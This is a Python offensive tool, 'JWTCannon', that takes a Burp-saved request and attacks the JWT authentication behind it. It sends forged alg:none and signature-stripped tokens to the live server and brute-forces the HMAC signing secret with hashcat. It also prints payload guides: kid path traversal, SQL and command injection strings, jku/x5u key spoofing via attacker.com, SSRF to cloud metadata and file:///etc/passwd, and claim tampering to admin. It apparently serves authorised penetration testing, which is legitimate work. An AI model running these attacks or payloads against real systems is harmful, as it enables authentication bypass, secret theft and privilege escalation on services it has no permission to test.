#!/usr/bin/env python3
"""
JWTCannon - Automated JWT Security Tester (Hashcat Edition)
Input: Burp Suite saved request (text file)
Output: Colorful terminal output
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import urllib3
import requests

from colorama import Fore, Back, Style, init as colorama_init

colorama_init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Proxy support ----------

PROXY_URL = None

def get_proxies():
    """Return requests proxies dict, or None if no proxy configured."""
    if not PROXY_URL:
        return None
    return {"http": PROXY_URL, "https": PROXY_URL}

def c_proxy(msg):
    return f"{Fore.BLUE}[proxy]{Style.RESET_ALL} {msg}"

# ---------- Constants ----------

JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

NONE_VARIANTS = [
    'none', 'None', 'NONE', 'nOnE', 'noNE', 'nONe', 'NonE',
    'None ', ' none', 'null', 'NULL', 'Null', '',
]

SECLISTS_PATHS = [
    '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
    '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
    '/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt'
]

HASHCAT_RULE_PATHS = [
    "/usr/share/hashcat/rules/best64.rule",
    "/usr/lib/hashcat/rules/best64.rule",
    "/usr/local/share/hashcat/rules/best64.rule",
    "/opt/hashcat/rules/best64.rule",
    "/usr/share/doc/hashcat/rules/best64.rule",
    "/opt/homebrew/share/hashcat/rules/best64.rule",
    "C:\\hashcat\\rules\\best64.rule",
]

def find_best64_rule():
    """Return path to best64.rule, or None if not found."""
    for p in HASHCAT_RULE_PATHS:
        if os.path.isfile(p):
            return p
    return None

SEPARATOR = "=" * 70

# ---------- Color Helpers ----------

def c_info(msg):    return f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}"
def c_ok(msg):      return f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}"
def c_warn(msg):    return f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}"
def c_fail(msg):    return f"{Fore.RED}[-]{Style.RESET_ALL} {msg}"
def c_hit(msg):     return f"{Back.RED}{Fore.WHITE}[VULNERABLE]{Style.RESET_ALL} {msg}"
def c_title(msg):   return f"{Fore.MAGENTA}{Style.BRIGHT}{msg}{Style.RESET_ALL}"
def c_sep():        return f"{Fore.MAGENTA}{SEPARATOR}{Style.RESET_ALL}"

# ---------- Base64URL ----------

def b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)

def b64url_encode(data) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# ---------- HTTP request parsing ----------

def parse_http_request(raw: str) -> dict:
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        head, body = raw, ""

    lines = head.splitlines()
    if not lines:
        raise ValueError("Empty request")

    parts = lines[0].split(" ", 2)
    if len(parts) < 3:
        raise ValueError("Invalid request line: " + lines[0])
    method, path, version = parts

    headers = {}
    for line in lines[1:]:
        if ": " in line:
            k, v = line.split(": ", 1)
            headers[k] = v
        elif ":" in line:
            k, v = line.split(":", 1)
            headers[k] = v.strip()

    return {
        "method": method, "path": path, "version": version,
        "headers": headers, "body": body,
        "host": headers.get("Host", ""), "raw": raw,
    }

def load_burp_request(path: str) -> dict:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return parse_http_request(f.read())

# ---------- JWT helpers ----------

def find_jwts(raw_request: str):
    return list(dict.fromkeys(JWT_REGEX.findall(raw_request)))

def parse_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None
    return {
        "raw": token,
        "header_b64": parts[0], "payload_b64": parts[1], "signature_b64": parts[2],
        "header": header, "payload": payload,
    }

def expiry_status(jwt_info, skew: int = 30):
    exp = jwt_info["payload"].get("exp")
    if exp is None:
        return "missing", None
    try:
        exp = int(exp)
    except (TypeError, ValueError):
        return "missing", None
    now = int(time.time())
    ttl = exp - now
    if ttl <= skew:
        return "expired", ttl
    return "valid", ttl

def handle_token_expiry(jwt_info):
    state, ttl = expiry_status(jwt_info)

    if state == "missing":
        print(c_info("Token has no 'exp' claim."))
        return True

    if state == "valid":
        h = ttl // 3600
        m = (ttl % 3600) // 60
        s = ttl % 60
        print(c_info(f"Token valid for ~{ttl}s ({h}h {m}m {s}s)"))
        return True

    print()
    print(c_sep())
    print(c_warn("TOKEN IS EXPIRED"))
    print(c_sep())
    print(c_warn(f"exp was {abs(ttl)}s ago."))
    print()
    print("What to do now:")
    print("  1. Open the same request in Burp Repeater / Proxy.")
    print("  2. Trigger the app's normal flow so it refreshes the access token")
    print("     (e.g. click around, reload the page, re-login if needed).")
    print("  3. In Burp, right-click the FRESH request -> 'Copy to file'")
    print("     and overwrite your input request file.")
    print("  4. Re-run this script.")
    print()
    print(c_info("This tool intentionally does NOT guess refresh endpoints."))
    print(c_info("Expired tokens produce false results for bypass tests."))
    print()
    try:
        answer = input(f"{Fore.YELLOW}Continue anyway with the expired token? [y/N]: {Style.RESET_ALL}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        answer = "n"
    if answer != "y":
        print(c_info("Exiting so you can re-capture a fresh request."))
        sys.exit(0)
    print(c_warn("Continuing with the expired token. Results may be misleading."))
    return True

# ---------- HTTP sending ----------

def _build_url_and_headers(req, scheme):
    host_hdr = req["host"]
    if ":" in host_hdr:
        host, port = host_hdr.rsplit(":", 1)
        try:
            port = int(port)
        except ValueError:
            port = 443 if scheme == "https" else 80
    else:
        host = host_hdr
        port = 443 if scheme == "https" else 80

    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        url = f"{scheme}://{host}{req['path']}"
    else:
        url = f"{scheme}://{host}:{port}{req['path']}"

    headers = dict(req["headers"])
    for h in ("Host", "host", "Content-Length", "content-length"):
        headers.pop(h, None)
    return url, headers

def send_with_token(req: dict, original_token: str, new_token: str,
                    scheme: str = "https", timeout: int = 15):
    raw = req["raw"].replace(original_token, new_token)
    try:
        mod = parse_http_request(raw)
    except Exception:
        return None
    url, headers = _build_url_and_headers(mod, scheme)
    try:
        return requests.request(
            mod["method"], url, headers=headers,
            data=mod["body"] if mod["body"] else None,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
            proxies=get_proxies(),   # <-- added
        )
    except Exception:
        return None

def baseline_response(req, jwt_info, scheme):
    print(c_info("Sending baseline request with original token..."))
    r = send_with_token(req, jwt_info["raw"], jwt_info["raw"], scheme)
    if r is None:
        print(c_fail("Could not reach target. Check host/scheme/connectivity."))
        return None
    print(c_info(f"Baseline: HTTP {r.status_code}, {len(r.content)} bytes"))
    return r

def looks_like_bypass(test_resp, base_resp):
    if test_resp is None or base_resp is None:
        return False
    if test_resp.status_code != base_resp.status_code:
        return False
    return abs(len(test_resp.content) - len(base_resp.content)) < 50

# ---------- Hashcat Detection ----------

def find_hashcat():
    """Return path to hashcat binary, or None."""
    for name in ("hashcat", "hashcat64.exe", "hashcat.bin"):
        path = shutil.which(name)
        if path:
            return path
    return None
    
def check_hashcat_backend(hashcat_path):
    """Return True if hashcat has a usable compute backend (OpenCL/CUDA/HIP)."""
    try:
        proc = subprocess.run([hashcat_path, "-I"],
                              capture_output=True, text=True, timeout=30)
    except Exception as e:
        print(c_warn(f"Could not query hashcat backends: {e}"))
        return False

    out = proc.stdout + proc.stderr

    if ("CL_PLATFORM_NOT_FOUND_KHR" in out
            or "No OpenCL" in out
            or "No devices found" in out):
        print()
        print(c_fail("Hashcat has NO usable backend (OpenCL/CUDA/HIP)."))
        print(c_warn("On Kali, install the CPU OpenCL runtime:"))
        print(f"  {Fore.GREEN}sudo apt install -y pocl-opencl-icd clinfo{Style.RESET_ALL}")
        print(c_warn("Then verify with:  hashcat -I"))
        print()
        return False

    print(c_ok("Hashcat backend detected:"))
    for line in out.splitlines():
        if any(k in line for k in ("Name", "Type", "Vendor", "Device ID", "Platform ID")):
            print(f"  {Fore.CYAN}{line.strip()}{Style.RESET_ALL}")
    return True


def check_hashcat_available():
    hc = find_hashcat()
    if not hc:
        print(c_fail("Hashcat NOT FOUND in PATH."))
        print(c_info("Install with:  sudo apt install hashcat"))
        return None
    try:
        ver = subprocess.run([hc, "--version"], capture_output=True, text=True, timeout=10)
        ver_str = ver.stdout.strip() or ver.stderr.strip()
        print(c_ok(f"Hashcat found: {hc}  ({ver_str})"))
    except Exception as e:
        print(c_warn(f"Hashcat found at {hc} but version check failed: {e}"))
    return hc

# ---------- Hashcat Cracking ----------

def write_hashfile(jwt_info, path):
    """Write the full JWT to a file for hashcat mode 16500."""
    with open(path, "w") as f:
        f.write(jwt_info["raw"] + "\n")

def build_mask(charset_choice):
    """
    Build (custom_charset_string, custom_placeholder).

    Instead of using ?l/?d separately per position, we build a SINGLE custom
    charset that combines all selected character classes, then use ?1 for
    every position in the mask.

    charset_choice examples:
        'an'  -> lowercase + digits          (36 chars)
        'aA'  -> lower + upper               (52 chars)
        'ans' -> lower + digits + special    (69 chars)
        'all' -> lower + upper + digits + special  (~90 chars)
    """
    parts = []
    if 'a' in charset_choice:
        parts.append('?l')
    if 'A' in charset_choice:
        parts.append('?u')
    if 'n' in charset_choice:
        parts.append('?d')
    if 's' in charset_choice:
        parts.append('?s')

    if not parts:
        parts = ['?l', '?d']   # default

    # Custom charset 1 = all selected classes combined
    custom_charset = "".join(parts)
    return custom_charset, "?1"

def crack_with_hashcat_wordlist(jwt_info, hashcat_path, wordlist_path):
    print()
    print(c_sep())
    print(c_title("TEST 5a: Hashcat Wordlist Attack"))
    print(c_sep())

    with tempfile.TemporaryDirectory() as tmpdir:
        hashfile = os.path.join(tmpdir, "jwt.hash")
        potfile  = os.path.join(tmpdir, "hashcat.potfile")
        write_hashfile(jwt_info, hashfile)

        cmd = [
            hashcat_path,
            "-a", "0",
            "-m", "16500",
            hashfile,
            wordlist_path,
            "--potfile-path", potfile,
            "--status",
            "--status-timer", "5",
            "--force",
            "-O",
            "-w", "3",
        ]

        # Add best64.rule only if it exists
        rule_path = find_best64_rule()
        if rule_path:
            cmd += ["-r", rule_path]
            print(c_info(f"Using rules: {rule_path}"))
        else:
            print(c_warn("best64.rule not found — running wordlist without rules."))
            print(c_info("Install rules:  sudo apt install hashcat-data   (or hashcat)"))
            print(c_info("Common paths searched:"))
            for rp in HASHCAT_RULE_PATHS:
                print(f"    - {rp}")

        print(c_info(f"Hashcat command: {' '.join(cmd)}"))
        print()

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        except subprocess.TimeoutExpired:
            print(c_warn("Hashcat wordlist attack timed out (1 hour)."))
            return None
        except Exception as e:
            print(c_fail(f"Hashcat error: {e}"))
            return None

        out = proc.stdout + proc.stderr
        print(out)

        if os.path.isfile(potfile):
            with open(potfile) as f:
                for line in f:
                    if ":" in line:
                        secret = line.split(":", 1)[1].strip()
                        print(c_ok(f"SECRET FOUND in wordlist: {secret!r}"))
                        return secret

        print(c_fail("No match in wordlist."))
        return None

def crack_with_hashcat_mask(jwt_info, hashcat_path, charset_choice, min_len, max_len):
    print()
    print(c_sep())
    print(c_title("TEST 5b: Hashcat Mask / Incremental Brute-Force"))
    print(c_sep())

    custom_charset, placeholder = build_mask(charset_choice)

    # Build the full mask: ?1 repeated max_len times
    full_mask = placeholder * max_len

    # Rough size estimate for the warning
    charset_size = 0
    if 'a' in charset_choice: charset_size += 26
    if 'A' in charset_choice: charset_size += 26
    if 'n' in charset_choice: charset_size += 10
    if 's' in charset_choice: charset_size += 32
    if charset_size == 0:
        charset_size = 36
    space = sum(charset_size ** L for L in range(min_len, max_len + 1))

    print(c_info(f"Charset choice : {charset_choice!r}"))
    print(c_info(f"Charset size   : {charset_size}"))
    print(c_info(f"Length range   : {min_len}-{max_len}"))
    print(c_info(f"Custom charset : -1 {custom_charset}"))
    print(c_info(f"Mask           : {full_mask}   (each '?1' = one char from custom set)"))
    print(c_info(f"Approx space   : {space:,}"))
    print(c_info("Using --increment so hashcat tries shorter lengths first."))
    print()

    with tempfile.TemporaryDirectory() as tmpdir:
        hashfile = os.path.join(tmpdir, "jwt.hash")
        potfile  = os.path.join(tmpdir, "hashcat.potfile")
        write_hashfile(jwt_info, hashfile)

        cmd = [
            hashcat_path,
            "-a", "3",
            "-m", "16500",
            hashfile,
            "-1", custom_charset,
            full_mask,
            "--increment",
            "--increment-min", str(min_len),
            "--increment-max", str(max_len),
            "--potfile-path", potfile,
            "--status",
            "--status-timer", "5",
            "--force",
            "-O",
            "-w", "3",
        ]

        print(c_info(f"Hashcat command: {' '.join(cmd)}"))
        print(c_warn("This may take a long time. Press Ctrl+C to stop."))
        print()

        start = time.time()
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            for line in proc.stdout:
                line = line.rstrip("\n")
                if "Progress" in line or "Recovered" in line or "Time.Started" in line:
                    print(f"  {Fore.CYAN}{line}{Style.RESET_ALL}")
                elif "Cracked" in line or "Recovered........: 1/1" in line:
                    print(f"  {Fore.GREEN}{line}{Style.RESET_ALL}")
                elif "ERROR" in line or "WARNING" in line or "No such file" in line:
                    print(f"  {Fore.YELLOW}{line}{Style.RESET_ALL}")
            proc.wait(timeout=60)
        except KeyboardInterrupt:
            print()
            print(c_warn("Interrupted. Stopping hashcat..."))
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()
            return None
        except Exception as e:
            print(c_fail(f"Hashcat error: {e}"))
            return None

        elapsed = time.time() - start

        if os.path.isfile(potfile):
            with open(potfile) as f:
                for line in f:
                    if ":" in line:
                        secret = line.split(":", 1)[1].strip()
                        print()
                        print(c_ok(f"SECRET FOUND: {secret!r}  (after {elapsed:.1f}s)"))
                        return secret

        print()
        print(c_fail("Not found within search space."))
        return None

# ---------- Test 1: alg:none ----------

def test_alg_none(req, jwt_info, base_resp, scheme):
    print()
    print(c_sep())
    print(c_title("TEST 1: alg:none Attack Variations"))
    print(c_sep())

    hits = []
    original_header = jwt_info["header"]
    payload_b64 = jwt_info["payload_b64"]

    for variant in NONE_VARIANTS:
        new_header = dict(original_header)
        new_header["alg"] = variant
        hdr_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        new_token = f"{hdr_b64}.{payload_b64}."

        resp = send_with_token(req, jwt_info["raw"], new_token, scheme)
        if resp is None:
            print(f"  {c_fail(f'alg={variant!r:10} -> request failed')}")
            continue
        bypass = looks_like_bypass(resp, base_resp)
        marker = f"  {Back.RED}{Fore.WHITE} POSSIBLE BYPASS {Style.RESET_ALL}" if bypass else ""
        status_color = Fore.GREEN if not bypass else Fore.RED
        print(f"  alg={variant!r:10} -> {status_color}HTTP {resp.status_code}{Style.RESET_ALL} "
              f"({len(resp.content)} bytes){marker}")
        if bypass:
            hits.append(variant)

    if hits:
        print()
        print(c_hit(f"POTENTIAL alg:none BYPASS with: {hits}"))
        print(c_warn("Try modifying payload claims (role:admin, user_id:1) and resend."))
    else:
        print()
        print(c_ok("Server appears to reject alg:none variants."))
    return hits

# ---------- Test 2: signature stripping ----------

def test_sig_stripping(req, jwt_info, base_resp, scheme):
    print()
    print(c_sep())
    print(c_title("TEST 2: Signature Stripping"))
    print(c_sep())

    hb, pb = jwt_info["header_b64"], jwt_info["payload_b64"]
    variants = [
        ("Empty signature (trailing dot)", f"{hb}.{pb}."),
        ("No third part (2 segments)",    f"{hb}.{pb}"),
        ("Empty signature + space",       f"{hb}.{pb}. "),
    ]

    hit = None
    for name, token in variants:
        resp = send_with_token(req, jwt_info["raw"], token, scheme)
        if resp is None:
            print(f"  {name:35} -> {c_fail('request failed')}")
            continue
        bypass = looks_like_bypass(resp, base_resp)
        marker = f"  {Back.RED}{Fore.WHITE} ACCEPTED! VULNERABLE! {Style.RESET_ALL}" if bypass else ""
        status_color = Fore.GREEN if not bypass else Fore.RED
        print(f"  {name:35} -> {status_color}HTTP {resp.status_code}{Style.RESET_ALL} "
              f"({len(resp.content)} bytes){marker}")
        if bypass:
            hit = name

    if hit:
        print()
        print(c_hit(f"Server accepted unsigned token ({hit})."))
        print(c_warn("NEXT STEP: Modify claims (role -> admin, is_admin -> true,"))
        print(c_warn("  user_id -> 1, sub -> administrator), re-encode, resend."))
    else:
        print()
        print(c_ok("Server appears to require a valid signature."))
    return hit

# ---------- Test 3: kid ----------

def analyze_kid(jwt_info):
    header = jwt_info["header"]
    if "kid" not in header:
        return False
    print()
    print(c_sep())
    print(c_title("TEST 3: 'kid' Header Detected - Attack Guide"))
    print(c_sep())
    print(c_warn(f"kid value: {header['kid']!r}"))
    print()
    print("The 'kid' tells the server which key to load for verification.")
    print("If unsanitized, this is a high-impact attack surface.")
    print()

    print(f"{Fore.YELLOW}  1. Path Traversal (read file as HMAC key){Style.RESET_ALL}")
    print("     - kid = ../../../../dev/null  -> sign with EMPTY secret")
    print("     - kid = ../../../../etc/hostname")
    print("     - kid = ../../../../proc/sys/kernel/randomize_va_space")
    print("     - kid = ../../../../tmp/known.txt")
    print()
    print(f"{Fore.YELLOW}  2. SQL Injection in key lookup{Style.RESET_ALL}")
    print("     - kid = ' UNION SELECT 'mysecret'--   (sign with 'mysecret')")
    print("     - kid = ' OR '1'='1")
    print("     - kid = ' OR SLEEP(5)--   (blind time-based)")
    print("     - Enumerate with sqlmap if kid is reflected in query")
    print()
    print(f"{Fore.YELLOW}  3. Command Injection{Style.RESET_ALL}")
    print("     - kid = | whoami")
    print("     - kid = $(whoami)")
    print("     - kid = `id`")
    print()
    print(f"{Fore.YELLOW}  4. Directory Traversal + Null Byte (older Java){Style.RESET_ALL}")
    print("     - kid = ../../../../dev/null%00")
    print()
    return True

# ---------- Test 4: jku / x5u ----------

def analyze_jku_x5u(jwt_info):
    header = jwt_info["header"]
    has_jku = "jku" in header
    has_x5u = "x5u" in header
    if not (has_jku or has_x5u):
        return False
    print()
    print(c_sep())
    print(c_title("TEST 4: 'jku' / 'x5u' Header Detected - Attack Guide"))
    print(c_sep())

    if has_jku:
        print(c_warn(f"jku value: {header['jku']!r}"))
        print()
        print(f"{Fore.YELLOW}JKU Injection:{Style.RESET_ALL}")
        print("  1. openssl genrsa -out attacker.key 2048")
        print("     openssl rsa -in attacker.key -pubout -out attacker.pub")
        print("  2. Host a JWKS with your public key at attacker.com/jwks.json")
        print("  3. Sign token with attacker.key (RS256) and set")
        print('     \"jku\": \"https://attacker.com/jwks.json\"')
        print("  4. Server fetches your JWKS -> verification succeeds with YOUR key.")
        print()
        print(f"{Fore.YELLOW}  Also test SSRF:{Style.RESET_ALL}")
        print("     - jku = http://169.254.169.254/latest/meta-data/")
        print("     - jku = http://127.0.0.1:8080/actuator/env")
        print("     - jku = file:///etc/passwd")
        print()

    if has_x5u:
        print(c_warn(f"x5u value: {header['x5u']!r}"))
        print()
        print(f"{Fore.YELLOW}X5U Injection:{Style.RESET_ALL}")
        print("  1. openssl req -x509 -newkey rsa:2048 -keyout attacker.key \\")
        print("       -out attacker.pem -days 365 -nodes -subj '/CN=attacker'")
        print("  2. Host attacker.pem at attacker.com/cert.pem")
        print("  3. Sign JWT with attacker.key (RS256), set")
        print('     \"x5u\": \"https://attacker.com/cert.pem\"')
        print("  4. Send; server trusts your cert -> bypass.")
        print()
    return True

# ---------- Cracking config ----------

def prompt_crack_config():
    print()
    print(c_sep())
    print(c_title("CRACKING CONFIGURATION"))
    print(c_sep())
    print("Character set options:")
    print(f"  {Fore.GREEN}A{Style.RESET_ALL}   = Uppercase (A-Z)")
    print(f"  {Fore.GREEN}a{Style.RESET_ALL}   = Lowercase (a-z)")
    print(f"  {Fore.GREEN}n{Style.RESET_ALL}   = Numbers (0-9)")
    print(f"  {Fore.GREEN}s{Style.RESET_ALL}   = Special characters")
    print("  (combine: 'an', 'aA', 'ans', or 'all')")
    print()

    try:
        choice = input(f"{Fore.CYAN}Charset [default: an]: {Style.RESET_ALL}").strip() or "an"
        min_len = int(input(f"{Fore.CYAN}Min length [default: 5]: {Style.RESET_ALL}").strip() or "5")
        max_len = int(input(f"{Fore.CYAN}Max length [default: 12]: {Style.RESET_ALL}").strip() or "12")
        if choice.lower() == "all":
            choice = "aAns"
    except (EOFError, KeyboardInterrupt):
        print(c_warn("Using defaults."))
        choice, min_len, max_len = "an", 5, 12

    if min_len < 1:
        min_len = 1
    if max_len < min_len:
        max_len = min_len

    print()
    print(c_info(f"Charset choice : {choice!r}"))
    print(c_info(f"Length range   : {min_len}-{max_len}"))
    print(c_info("Hashcat will handle the search space efficiently."))
    return choice, min_len, max_len

# ---------- SecLists discovery ----------

def find_seclists():
    return next((p for p in SECLISTS_PATHS if os.path.isfile(p)), None)

# ---------- Remaining attacks guide ----------

def print_remaining_attacks(jwt_info):
    print()
    print(c_sep())
    print(c_title("OTHER ATTACKS TO TEST MANUALLY (NOT AUTOMATED)"))
    print(c_sep())
    print(f"{Fore.YELLOW}1. RS256 -> HS256 Algorithm Confusion{Style.RESET_ALL}")
    print("   - Fetch server's RSA public key (/.well-known/jwks.json)")
    print("   - Change alg to HS256, sign with PUBLIC KEY PEM bytes as HMAC secret")
    print("   - Tool: jwt_tool.py <token> -X k -pk public.pem")
    print()
    print(f"{Fore.YELLOW}2. Embedded JWK (jwk header injection){Style.RESET_ALL}")
    print("   - Add \"jwk\":{...your public JWK...} to header, sign with your key")
    print("   - Tool: jwt_tool.py <token> -X i")
    print()
    print(f"{Fore.YELLOW}3. JKU / X5U Spoofing (covered above){Style.RESET_ALL}")
    print("   - Tool: jwt_tool.py <token> -X s -ju https://attacker/jwks.json")
    print()
    print(f"{Fore.YELLOW}4. Token Replay{Style.RESET_ALL}")
    print("   - Use captured token after logout; check blacklist / jti revocation")
    print()
    print(f"{Fore.YELLOW}5. Expired / Not-Before Bypass{Style.RESET_ALL}")
    print("   - Modify exp/nbf; some servers skip claim validation")
    print()
    print(f"{Fore.YELLOW}6. Claim Tampering (after any bypass){Style.RESET_ALL}")
    print("   - role -> admin, is_admin -> true, user_id -> 1, sub -> administrator")
    print()
    print(f"{Fore.YELLOW}7. kid Injection (covered above){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}8. JWT Storage / XSS{Style.RESET_ALL}")
    print("   - localStorage vs HttpOnly cookie")
    print()
    print(f"{Fore.YELLOW}9. Weak HMAC Secret (covered above){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}10. Cross-Service Confusion{Style.RESET_ALL}")
    print("    - Same signing key across services/envs")
    print()
    print(f"{Fore.YELLOW}11. Long-Lived / No-Expiry Tokens{Style.RESET_ALL}")
    print("    - Check exp existence and refresh rotation")
    print()
    print(f"{Fore.YELLOW}12. Header Parameter Pollution{Style.RESET_ALL}")
    print("    - Duplicate alg / kid / jku")
    print()
    print(c_info("Tools: jwt_tool, hashcat (-m 16500), john, Burp JWT Editor, jwt.io"))

# ---------- Main ----------

def main():
    p = argparse.ArgumentParser(description="JWTCannon - Automated JWT tester (Hashcat Edition)")
    p.add_argument("request_file", help="Burp-saved request text file")
    p.add_argument("--scheme", default="https", choices=["http", "https"])
    p.add_argument("--skip-crack", action="store_true")
    p.add_argument("--ignore-expiry", action="store_true",
                   help="Skip the expiry prompt (continue regardless)")
    p.add_argument("--hashcat", default=None,
                   help="Path to hashcat binary (auto-detect if omitted)")               
    p.add_argument("--proxy", default=None,
                   help="Proxy URL for all requests, e.g. http://127.0.0.1:8080")
    p.add_argument("--burp", action="store_true",
                   help="Shortcut: route requests through Burp at 127.0.0.1:8080")
    args = p.parse_args()
    
        # ---- Proxy setup ----
    global PROXY_URL
    if args.burp:
        PROXY_URL = "http://127.0.0.1:8080"
    elif args.proxy:
        PROXY_URL = args.proxy

    if PROXY_URL:
        print(c_proxy(f"All HTTP requests will be sent via {PROXY_URL}"))
        print(c_proxy("Tip: disable 'Intercept' in Burp (Proxy tab) so requests pass through."))
    else:
        print(c_info("No proxy configured. Use --burp or --proxy to route via Burp."))

    print(c_sep())
    print(c_title("  J W T C A N N O N   -   H A S H C A T   E D I T I O N  "))
    print(c_sep())

    try:
        req = load_burp_request(args.request_file)
    except Exception as e:
        print(c_fail(f"Failed to parse request file: {e}"))
        sys.exit(1)
    print(c_info(f"Loaded: {req['method']} {req['path']} Host: {req['host']}"))

    jwts = find_jwts(req["raw"])
    if not jwts:
        print(c_fail("No JWT found. Exiting."))
        sys.exit(1)
    print(c_info(f"Found {len(jwts)} JWT(s)"))

    jwt_info = parse_jwt(jwts[0])
    if not jwt_info:
        print(c_fail("Failed to parse JWT."))
        sys.exit(1)

    print(c_info(f"Algorithm: {Fore.YELLOW}{jwt_info['header'].get('alg')}{Style.RESET_ALL}"))
    print(c_info(f"Header : {json.dumps(jwt_info['header'])}"))
    print(c_info(f"Payload: {json.dumps(jwt_info['payload'])}"))

    # Expiry handling
    if not args.ignore_expiry:
        handle_token_expiry(jwt_info)

    # Hashcat detection
    hashcat_path = args.hashcat or find_hashcat()
    if not args.skip_crack:
        hashcat_path = check_hashcat_available()
        if hashcat_path is None:
            print(c_warn("Cracking will be skipped (no hashcat)."))
            args.skip_crack = True
        elif not check_hashcat_backend(hashcat_path):
            print(c_warn("Cracking will be skipped (no OpenCL/CUDA backend)."))
            args.skip_crack = True

    # Pre-prompt cracking config
    if not args.skip_crack:
        choice, min_len, max_len = prompt_crack_config()
    else:
        choice, min_len, max_len = "", 0, 0

    # Baseline
    base_resp = baseline_response(req, jwt_info, args.scheme)
    if base_resp is None:
        print(c_fail("No baseline. Exiting."))
        sys.exit(1)

    # Tests
    test_alg_none(req, jwt_info, base_resp, args.scheme)
    test_sig_stripping(req, jwt_info, base_resp, args.scheme)
    analyze_kid(jwt_info)
    analyze_jku_x5u(jwt_info)

    # Cracking (LAST)
    if not args.skip_crack and hashcat_path:
        found = None

        # 5a: SecLists wordlist
        wordlist = find_seclists()
        if wordlist:
            found = crack_with_hashcat_wordlist(jwt_info, hashcat_path, wordlist)
        else:
            print()
            print(c_warn("SecLists wordlist NOT FOUND. Looked in:"))
            for p in SECLISTS_PATHS:
                print(f"    - {p}")
            print(c_info("Install:  sudo apt install seclists"))
            print(c_info("Skipping wordlist phase."))

        # 5b: Mask brute-force
        if not found:
            found = crack_with_hashcat_mask(jwt_info, hashcat_path, choice, min_len, max_len)

        if found:
            print()
            print(c_hit(f"WEAK SECRET CONFIRMED: {found!r}"))
        else:
            print()
            print(c_ok("Secret not recovered. Likely strong."))
            
        # 5b: Mask brute-force
        #if not found:
         #   found = crack_with_hashcat_mask(jwt_info, hashcat_path, choice, min_len, max_len)

    # Final guide
    print_remaining_attacks(jwt_info)

    print()
    print(c_sep())
    print(c_title("TESTING COMPLETE"))
    print(c_sep())

if __name__ == "__main__":
    try:
        
        
        
        
        
        main()
    except KeyboardInterrupt:
        print()
        print(c_warn("Interrupted."))
        sys.exit(130)
